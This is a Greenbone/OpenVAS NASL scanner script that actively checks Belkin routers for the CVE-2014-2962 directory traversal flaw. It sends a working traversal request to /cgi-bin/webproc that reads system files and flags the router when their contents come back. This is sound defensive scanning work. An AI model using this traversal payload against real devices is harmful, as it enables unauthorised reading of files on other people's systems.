# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806147");
  script_version("2023-06-28T05:05:21+0000");
  script_tag(name:"last_modification", value:"2023-06-28 05:05:21 +0000 (Wed, 28 Jun 2023)");
  script_tag(name:"creation_date", value:"2015-10-29 12:12:25 +0530 (Thu, 29 Oct 2015)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2014-2962");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Workaround");

  script_name("Belkin Router Directory Traversal Vulnerability (Oct 2015) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("mini_httpd/banner");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Belkin Routers are prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation allows remote attackers to read
  arbitrary files on the target system.");

  script_tag(name:"affected", value:"Belkin N300/150 WiFi N Router, other devices may also be
  affected.");

  script_tag(name:"solution", value:"As a workaround ensure that appropriate firewall rules are in
  place to restrict access to port 80/tcp from external untrusted sources.");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/774788");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38488");
  script_xref(name:"URL", value:"http://www.belkin.com/us/support-article?articleNum=109400");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133913/belkin-disclose.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!banner = http_get_remote_headers(port: port))
  exit(0);

files = traversal_files("linux");

if (banner =~ "Server\s*:\s*mini_httpd") {
  foreach pattern(keys(files)) {
    file = files[pattern];

    url = "/cgi-bin/webproc?getpage=../../../../../../../../../../" + file +
          "&var:getpage=html/index.html&var:language=en_us&var:oldpage=(null)&var:page=login";

    if (http_vuln_check(port: port, url: url, pattern: pattern)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
